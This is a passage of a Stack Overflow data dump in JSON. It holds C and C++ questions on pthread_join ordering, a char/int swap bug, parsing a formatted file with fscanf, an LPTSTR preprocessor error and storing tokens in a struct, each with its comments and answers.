end_arr3[nl][members])\n{\n   int i,k;\n\n   for(i=0;i&lt;members;i++)\n   {\n      for(k=0;k&lt;nl;k++)\n      {\n         printf(\"%c\",end_arr3[i][k]);\n      }\n      printf(\"\\n\");\n   }\n\n   return 0;\n}\n\n\nint clearArray(int nl, int members, char end_arr3[nl][members])\n{\n   int i,k;\n\n   for(i=0;i&lt;members;i++)\n   {\n      for(k=0;k&lt;nl;k++)\n      {\n         end_arr3[i][k] = ' ';\n      }\n   }\n\n   return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "multithreading"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1518021151, "post_id": 48668779, "comment_id": 84335355, "body": "If you do it like that, you might as well just call all of those functions in sequence and avoid the threading overhead"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 3, "creation_date": 1518021314, "post_id": 48668779, "comment_id": 84335463, "body": "note that your code looks more like C++ython to me :)"}], "answers": [{"comments": [{"owner": {"reputation": 839, "user_id": 1477869, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2ded2654469bf87bc5b4f8b110588e25?s=128&d=identicon&r=PG&f=1", "display_name": "OHHH", "link": "https://stackoverflow.com/users/1477869/ohhh"}, "edited": false, "score": 0, "creation_date": 1518022158, "post_id": 48668805, "comment_id": 84336044, "body": "I see. Does it mean that once you run the pthread_join loop, it will wait for the first one to finish and then for the second one, and so on, even if they don&#39;t necessarily finish in that order? e.g. will it only cleanup thread N after it has cleaned up all N-1 threads, even if N finished first?"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 839, "user_id": 1477869, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2ded2654469bf87bc5b4f8b110588e25?s=128&d=identicon&r=PG&f=1", "display_name": "OHHH", "link": "https://stackoverflow.com/users/1477869/ohhh"}, "edited": false, "score": 0, "creation_date": 1518022337, "post_id": 48668805, "comment_id": 84336154, "body": "yes, join is sequential. the idea of <code>join</code> in that context is to wait for <i>all</i> threads to finish. If the thread is already finished when <code>pthread_join</code> is called, then it returns immediately."}], "tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": true, "score": 2, "last_activity_date": 1518021154, "creation_date": 1518021154, "answer_id": 48668805, "question_id": 48668779, "link": "https://stackoverflow.com/questions/48668779/in-c-why-should-you-call-pthread-join-only-after-initializing-a-list-of-created/48668805#48668805", "title": "In C, why should you call pthread_join only after initializing a list of created threads?", "body": "<p>because if you do that, all threads run sequentially, since <code>pthread_join</code> waits for thread termination.</p>\n\n<p>So you're losing the benefit of running the threads at the same time, simply.</p>\n"}], "owner": {"reputation": 839, "user_id": 1477869, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/2ded2654469bf87bc5b4f8b110588e25?s=128&d=identicon&r=PG&f=1", "display_name": "OHHH", "link": "https://stackoverflow.com/users/1477869/ohhh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "accepted_answer_id": 48668805, "answer_count": 1, "score": 0, "last_activity_date": 1518022088, "creation_date": 1518021075, "last_edit_date": 1518022088, "question_id": 48668779, "link": "https://stackoverflow.com/questions/48668779/in-c-why-should-you-call-pthread-join-only-after-initializing-a-list-of-created", "title": "In C, why should you call pthread_join only after initializing a list of created threads?", "body": "<p>I understand what both do, but I have a question about the behavior of pthread_join.</p>\n\n<p>I noticed this pattern is pretty common in C (mind the pseudocode):</p>\n\n<pre><code>for i in some range:\n    thread[i] = pthread_create (...)\n\nfor i in some range:\n    pthread_join(&amp;thread[i]...)\n</code></pre>\n\n<p>Why can't it happen at the same time? e.g:</p>\n\n<pre><code>for i in some range:\n    thread[i] = pthread_create (...)\n    pthread_join(&amp;thread[i]...)\n</code></pre>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 3, "creation_date": 1518020217, "post_id": 48668416, "comment_id": 84334702, "body": "<code>swap</code> should take <code>char*</code> and not <code>int*</code>."}, {"owner": {"reputation": 323, "user_id": 9028098, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c6998a17853d32e83c5f8f7eec078b2e?s=128&d=identicon&r=PG&f=1", "display_name": "Ofek Pintok", "link": "https://stackoverflow.com/users/9028098/ofek-pintok"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518020528, "post_id": 48668416, "comment_id": 84334906, "body": "@EugeneSh. Good eye.. Thanks!"}], "answers": [{"tags": [], "owner": {"reputation": 36, "user_id": 9328601, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d55e7f95c0747ef9df3ebf19dec2637?s=128&d=identicon&r=PG&f=1", "display_name": "Karthik Datta", "link": "https://stackoverflow.com/users/9328601/karthik-datta"}, "is_accepted": true, "score": 2, "last_activity_date": 1518020455, "creation_date": 1518020455, "answer_id": 48668536, "question_id": 48668416, "link": "https://stackoverflow.com/questions/48668416/sort-a-string-of-capital-and-low-letters-in-c-by-swapping/48668536#48668536", "title": "sort a string of capital and low letters in c (by swapping)", "body": "<p>Change void swap(int *a, int *b) to void swap(char *a, char *b) , because you are referring to the address of the character not integer</p>\n"}], "owner": {"reputation": 323, "user_id": 9028098, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c6998a17853d32e83c5f8f7eec078b2e?s=128&d=identicon&r=PG&f=1", "display_name": "Ofek Pintok", "link": "https://stackoverflow.com/users/9028098/ofek-pintok"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 36, "favorite_count": 0, "accepted_answer_id": 48668536, "answer_count": 1, "score": 0, "last_activity_date": 1518020455, "creation_date": 1518020072, "question_id": 48668416, "link": "https://stackoverflow.com/questions/48668416/sort-a-string-of-capital-and-low-letters-in-c-by-swapping", "title": "sort a string of capital and low letters in c (by swapping)", "body": "<p>For example: AAbbCC should be AACCbb</p>\n\n<p>Everything works on the page, but for some reason, when the function swaps the values, the value of <code>str</code> changes (at the end of the running, the program prints the value of AAC)</p>\n\n<p>this is my code:</p>\n\n<pre><code>    void capital_to_Low(char *str)\n{\n\n    int i = 0, j = (strlen(str)) -1;\n\n    while (i &lt; j)\n    {\n        if (str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z')\n        {\n            swap(&amp;str[i], &amp;str[j--]);\n        }\n        else i++;\n\n    }\n    puts(str);\n}\n\nvoid swap(int *a, int *b)\n{\n    int temp;\n    temp = *a;\n    *a = *b;\n    *b = temp;\n}\n</code></pre>\n"}, {"tags": ["c", "scanf", "file-read"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1518019925, "post_id": 48668310, "comment_id": 84334503, "body": "First of all: <a href=\"https://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">Why is \u201cwhile ( !feof (file) )\u201d always wrong?</a>. Second: don&#39;t use <code>fscanf</code>. Use <code>fgets</code> and parse the result. Third -  if using <code>fscanf</code>, check it&#39;s return value. Fourth - what are your types?"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518021737, "post_id": 48668310, "comment_id": 84335758, "body": "@EugeneSh. This is actually one of the few questions where <code>feof()</code> is used properly.  There should be some kind of celebration."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518022025, "post_id": 48668310, "comment_id": 84335949, "body": "@AndrewHenle The <code>fscanf</code> in the end is reading more than a single character. So... not really."}, {"owner": {"reputation": 127, "user_id": 3308219, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/c9cb31ee364c4df27f4904e2a3a458a4?s=128&d=identicon&r=PG&f=1", "display_name": "user3308219", "link": "https://stackoverflow.com/users/3308219/user3308219"}, "edited": false, "score": 0, "creation_date": 1518022039, "post_id": 48668310, "comment_id": 84335959, "body": "I don&#39;t understand why <code>fscanf()</code> should be avoided in this context.  The search result I read seems to indicate that it&#39;s intended for formatted text, which the text file follows pretty rigidly.  I was generous and defined a maximum string length of 64 characters even though none of these strings are going to reach, much less exceed that length."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1518022840, "post_id": 48668310, "comment_id": 84336481, "body": "@user3308219 I&#39;d say all of the <code>scanf()</code> functions should always be avoided as they do not handle unexpected data, often in unexpected ways.  Yes, they&#39;re intended for formatted text, but formats aren&#39;t always specified well enough to be what I&#39;ll call &quot;<code>scanf()</code>-complete&quot;, and the <code>scanf()</code> failure modes can be perverse."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518023096, "post_id": 48668310, "comment_id": 84336678, "body": "@EugeneSh. I&#39;d say that&#39;s an inherent problem with <code>fscanf()</code> itself."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518030585, "post_id": 48668310, "comment_id": 84341016, "body": "@user3308219 Tip in regards to &quot;I don&#39;t understand why fscanf() should be avoided in this context&quot;, Although paradoxical, don&#39;t use <code>fscanf()</code> until you understand why <code>fscanf()</code> should be avoided in this context."}], "answers": [{"comments": [{"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "reply_to_user": {"reputation": 127, "user_id": 3308219, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/c9cb31ee364c4df27f4904e2a3a458a4?s=128&d=identicon&r=PG&f=1", "display_name": "user3308219", "link": "https://stackoverflow.com/users/3308219/user3308219"}, "edited": false, "score": 0, "creation_date": 1518021355, "post_id": 48668408, "comment_id": 84335489, "body": "@user3308219 Please take a look at the edit and the demo."}], "tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": true, "score": 0, "last_activity_date": 1518021549, "last_edit_date": 1518021549, "creation_date": 1518020024, "answer_id": 48668408, "question_id": 48668310, "link": "https://stackoverflow.com/questions/48668310/c-read-string-with-integers-from-formatted-text-file/48668408#48668408", "title": "C - Read string with integers from formatted text file", "body": "<p>The problem with your code is that the text contains spaces, which <code>%s</code> does not allow.</p>\n\n<p>Changing the format string to <code>%[^:]</code> will fix this problem.</p>\n\n<p>However, the code would remain vulnerable to buffer overrun. Make sure that your format string includes the max size of <code>colorStr</code> to prevent it:</p>\n\n<pre><code>char colorStr[100];\nfscanf(file, \" %99[^:]: %d %d %d\", colorStr, &amp;r, &amp;g, &amp;b);\n</code></pre>\n\n<p>Your code uses <code>feof(file)</code>, which is incorrect. You should put <code>fscanf</code> into loop header. This would let you remove the duplicate <code>fscanf</code> call before the loop:</p>\n\n<pre><code>while(fscanf(file, \" %99[^:]: %d %d %d\", colorStr, &amp;r, &amp;g, &amp;b) == 4) {\n    printf(\"%s: %d %d %d\\n\", colorStr, r, g, b);\n}\n</code></pre>\n\n<p>Note the space in front of the leading <code>%</code> format specifier. It instructs <code>fscanf</code> to skip the trailing spaces and/or <code>'\\n'</code> from the previous line.</p>\n\n<p><a href=\"https://ideone.com/uksQRl\" rel=\"nofollow noreferrer\">Demo.</a></p>\n"}], "owner": {"reputation": 127, "user_id": 3308219, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/c9cb31ee364c4df27f4904e2a3a458a4?s=128&d=identicon&r=PG&f=1", "display_name": "user3308219", "link": "https://stackoverflow.com/users/3308219/user3308219"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 632, "favorite_count": 0, "accepted_answer_id": 48668408, "answer_count": 1, "score": 2, "last_activity_date": 1518021549, "creation_date": 1518019701, "question_id": 48668310, "link": "https://stackoverflow.com/questions/48668310/c-read-string-with-integers-from-formatted-text-file", "title": "C - Read string with integers from formatted text file", "body": "<p>I have a text file following this format:</p>\n\n<pre><code>Thing 1: 0 0 128\nOther thing: 255 64 255\nSomething else: 32 32 8\n</code></pre>\n\n<p>I intend to add more to this file eventually but the format will remain the same.  What I want to do is read everything before the colon into a string and everything after it as an integer.  I've tried this:</p>\n\n<pre><code>fscanf((file = fopen(\"colors.txt\", \"r\")) == NULL){\n    return -1;\n}\n\nfscanf(\"%s: %d %d %d\", colorStr, &amp;r, &amp;g, &amp;b);\n\nwhile(!feof(file)){\n    printf(\"%s: %d %d %d\", colorStr, r, g, b);\n    fscanf(file, \"%s: %d %d %d\", colorStr, &amp;r, &amp;g, &amp;b);\n}\n\nfclose(file);\n</code></pre>\n\n<p>However, I get this output:</p>\n\n<pre><code>Thing 1:: 0 0 0\n0: 0 0 0\n0: 0 0 0\n128: 0 0 0\n</code></pre>\n\n<p>And so on.  Ideally, the output should read like this:</p>\n\n<pre><code>Thing 1: 0 0 128\nOther thing: 255 64 255\nSomething else: 32 32 8\n</code></pre>\n\n<p>How can I fix this?  The <code>colorStr</code>, <code>r</code>, <code>g</code>, and <code>b</code> variables were set up earlier in the program.</p>\n"}, {"tags": ["c++", "c", "winapi"], "comments": [{"owner": {"reputation": 10406, "user_id": 33987, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9915b127729c73da8b0b253f6c867e45?s=128&d=identicon&r=PG", "display_name": "Joris Timmermans", "link": "https://stackoverflow.com/users/33987/joris-timmermans"}, "edited": false, "score": 3, "creation_date": 1518019984, "post_id": 48668304, "comment_id": 84334542, "body": "Please post a minimal, complete and verifiable example - <a href=\"https://stackoverflow.com/help/mcve\">stackoverflow.com/help/mcve</a> ."}, {"owner": {"reputation": 8811, "user_id": 487892, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Leb5B.jpg?s=128&g=1", "display_name": "drescherjm", "link": "https://stackoverflow.com/users/487892/drescherjm"}, "edited": false, "score": 4, "creation_date": 1518020019, "post_id": 48668304, "comment_id": 84334563, "body": "<code>return_val = HKEY_CLASSES_ROOT, REGISTRY_KEY_FM, 0, KEY_QUERY_VALUE, &amp;register_key);</code> does not make sense to me. I assume you are missing some part of that line."}, {"owner": {"reputation": 135186, "user_id": 464581, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/v2PxU.jpg?s=128&g=1", "display_name": "Cheers and hth. - Alf", "link": "https://stackoverflow.com/users/464581/cheers-and-hth-alf"}, "edited": false, "score": 2, "creation_date": 1518020297, "post_id": 48668304, "comment_id": 84334764, "body": "The <code>T</code> stuff like <code>LPTSTR</code> and <code>_T</code> is in support for Windows 9x in the 1990s. Apart from the fact that your tools can&#39;t produce executables for those archaic Windows versions, the <code>T</code> stuff was obsolete already in the year 2000, with the introduction of Layer for Unicode. So you&#39;re using 17 years obsolete technology, that now is completely pointless since your tools can&#39;t create such executables. There are <b>costs</b> for using this stuff: more verbose code, and more brittle code. So don&#39;t."}, {"owner": {"reputation": 135186, "user_id": 464581, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/v2PxU.jpg?s=128&g=1", "display_name": "Cheers and hth. - Alf", "link": "https://stackoverflow.com/users/464581/cheers-and-hth-alf"}, "edited": false, "score": 1, "creation_date": 1518020548, "post_id": 48668304, "comment_id": 84334921, "body": "Re &quot;not getting the message in VS 2010&quot;, since you have <b>unmatched parenthesis</b> it can&#39;t compile with VS 2010. It appears that you&#39;re missing a function call. Is that your real code you&#39;re presenting?"}, {"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1518020754, "post_id": 48668304, "comment_id": 84335068, "body": "Guys, yes there are mismatched parens in the question, but it doesn&#39;t matter because an assignment operator for a primitive type such as long evaluates to a reference to the left-hand-side.  Only the left operand matters here."}, {"owner": {"reputation": 14021, "user_id": 7571258, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/fBP6e.png?s=128&g=1", "display_name": "zett42", "link": "https://stackoverflow.com/users/7571258/zett42"}, "edited": false, "score": 0, "creation_date": 1518023655, "post_id": 48668304, "comment_id": 84337019, "body": "Last line looks like part of a function call, propably <code>RegOpenKeyEx(</code> missing."}, {"owner": {"reputation": 14021, "user_id": 7571258, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/fBP6e.png?s=128&g=1", "display_name": "zett42", "link": "https://stackoverflow.com/users/7571258/zett42"}, "edited": false, "score": 1, "creation_date": 1518024075, "post_id": 48668304, "comment_id": 84337268, "body": "Also, <a href=\"https://stackoverflow.com/q/8356223/7571258\">string literals shouldn&#39;t be assigned to non-const pointer</a> (<code>LPTSTR</code> is typedef for <code>TCHAR*</code>). So you should write <code>LPCTSTR REGISTRY_KEY_FM =</code> (note the &quot;C&quot; in the type that indicates constness of the data pointed to) or even better <code>LPCWSTR REGISTRY_KEY_FM</code> and replace <code>_T(&quot;string&quot;)</code> by <code>L&quot;string&quot;</code> as explained by Cheers."}], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 3758867, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/b1658620994d4b859e9b94ebcd1947cd?s=128&d=identicon&r=PG&f=1", "display_name": "user3758867", "link": "https://stackoverflow.com/users/3758867/user3758867"}, "edited": false, "score": 0, "creation_date": 1518021871, "post_id": 48668604, "comment_id": 84335856, "body": "Thanks, you are right.. I was missing an <code>else</code> statement."}], "tags": [], "owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "is_accepted": true, "score": 1, "last_activity_date": 1518020644, "creation_date": 1518020644, "answer_id": 48668604, "question_id": 48668304, "link": "https://stackoverflow.com/questions/48668304/convert-lptstr-to-long/48668604#48668604", "title": "Convert LPTSTR to long", "body": "<p>Your preprocessor dispatch is missing an <code>#else</code>.  When the library version isn't recognized, this is what you get:</p>\n\n<pre><code>LPTSTR REGISTRY_KEY_FM = return_val = /* something */;\n</code></pre>\n\n<p>and that tries to initialize an <code>LPTSTR</code> with a value of type <code>long</code>.</p>\n\n<p>When you add the typeid for the new library version, also add these lines to prevent such problems in the future:</p>\n\n<pre><code>#else\n#error Unsupported FDK_LIBRARY_VERSION\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 3758867, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/b1658620994d4b859e9b94ebcd1947cd?s=128&d=identicon&r=PG&f=1", "display_name": "user3758867", "link": "https://stackoverflow.com/users/3758867/user3758867"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 144, "favorite_count": 0, "closed_date": 1518026603, "accepted_answer_id": 48668604, "answer_count": 1, "score": -4, "last_activity_date": 1518020644, "creation_date": 1518019683, "last_edit_date": 1518019933, "question_id": 48668304, "link": "https://stackoverflow.com/questions/48668304/convert-lptstr-to-long", "closed_reason": "Not suitable for this site", "title": "Convert LPTSTR to long", "body": "<p>I am getting a compile error while I am trying to initialize a long variable.</p>\n\n<pre><code>long return_val;\n\nHKEY register_key;\nLPTSTR REGISTRY_KEY_FM = \n#if FDK_LIBRARY_VERSION==0x13000000\n            _T(\"RL13.FR.Document\");\n#elif FDK_LIBRARY_VERSION==0x09000000\n            _T(\"RL9.FR.Document\");\n#elif FDK_LIBRARY_VERSION==0x08000000\n            _T(\"RL80.FR.Document\");\n#endif\n\n\nreturn_val = HKEY_CLASSES_ROOT, REGISTRY_KEY_FM, 0, KEY_QUERY_VALUE, &amp;register_key);\n</code></pre>\n\n<p>The error message in the last line is \"value of type \"long\" cannot be used to initialize an entity of type LPTSTR\"</p>\n\n<p>I am using Visual studio 2017 and also tried with visual studio 2013, but the error is same. However not getting the message in VS 2010. is there some type casting issue with the compiler of VS 2013 and VS2017? How to overcome this issue?</p>\n"}, {"tags": ["c", "struct", "token"], "comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1518019482, "post_id": 48668223, "comment_id": 84334179, "body": "Tin all this <code>#ifdef DEBUG</code> nonsense, and learn to use a debugger."}, {"owner": {"reputation": 7, "user_id": 8993845, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5q3zP.jpg?s=128&g=1", "display_name": "E.Bille", "link": "https://stackoverflow.com/users/8993845/e-bille"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1518019554, "post_id": 48668223, "comment_id": 84334233, "body": "I&#39;d love to do that, but the module is based on learning the very basic of way of doing it, i.e terminal and sublime text in my case."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1518019613, "post_id": 48668223, "comment_id": 84334283, "body": "Well do it your way for the sake of the course, and my way for the sake of getting a good job. That is, do it both ways."}, {"owner": {"reputation": 7, "user_id": 8993845, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5q3zP.jpg?s=128&g=1", "display_name": "E.Bille", "link": "https://stackoverflow.com/users/8993845/e-bille"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1518019828, "post_id": 48668223, "comment_id": 84334426, "body": "@Bathsheba Coming from writing Java in Eclipse last trimester I&#39;m very keen on using a debugger and will do so in the future. But, I do also see a point in not doing it to learn what is actually going on in the background.  :)"}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 1, "creation_date": 1518019888, "post_id": 48668223, "comment_id": 84334471, "body": "That&#39;s odd - I always think a debugger tells you exactly what is going on in the background."}], "answers": [{"tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": false, "score": 0, "last_activity_date": 1518019995, "last_edit_date": 1518019995, "creation_date": 1518019658, "answer_id": 48668300, "question_id": 48668223, "link": "https://stackoverflow.com/questions/48668223/storing-tokens-in-struct/48668300#48668300", "title": "Storing tokens in struct", "body": "<p><code>strcpy(w.word[i], token)</code>; is passing a <code>char</code> instead of <code>char*</code>. You can have a 2d array in the struct itself and same way you can make <code>count</code> contain the frequency of each words.</p>\n\n<pre><code>struct words\n{\n    char word[MAXWORDS][MAXLETTERINWORD];\n    unsigned int count[MAXWORDS];\n};\n</code></pre>\n\n<p>Then printing each word will be <code>printf(\"%s\\n\", w.word[i]);</code>. Also here do you need the <code>strtok</code>? Because after all you are getting your inputs using <code>fgets</code> in every loop iteration. And the <code>strtok</code> will run once. You can copy the buffer itself to the <code>word[index]</code>. </p>\n\n<p>Buffer doesn't point to any memory. It's UB to use buffer this way. Declare <code>buffer</code> to be an <code>char</code> array capable of holding a line.<code>char buffer[MAXLEN];</code>. Then getting the input would be </p>\n\n<pre><code>if(fgets(buffer,MAXLEN,stdin)==NULL){\n    fprintf(stderr,\"Error in input\\n\");\n    exit(EXIT_FAILURE);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 33821, "user_id": 45685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/y4RJr.jpg?s=128&g=1", "display_name": "AndersK", "link": "https://stackoverflow.com/users/45685/andersk"}, "is_accepted": true, "score": 0, "last_activity_date": 1518020697, "creation_date": 1518020697, "answer_id": 48668628, "question_id": 48668223, "link": "https://stackoverflow.com/questions/48668223/storing-tokens-in-struct/48668628#48668628", "title": "Storing tokens in struct", "body": "<p>for one thing buffer needs to have a size allocated to it, it seems it is just\nan uninitialized pointer in your code.</p>\n\n<p>once you do fgets(buffer,...) you enter undefined behavior territory if the \nbuffer does not point to a place where the input can be stored.</p>\n\n<p>so first declare buffer as an array</p>\n\n<pre><code>char buffer[512]; // or whatever size you deem is appropriate\n</code></pre>\n\n<p>then read the line into the buffer (instead of a for loop use while, you could check line length and quit loop if user didnt enter anything)</p>\n\n<pre><code>while 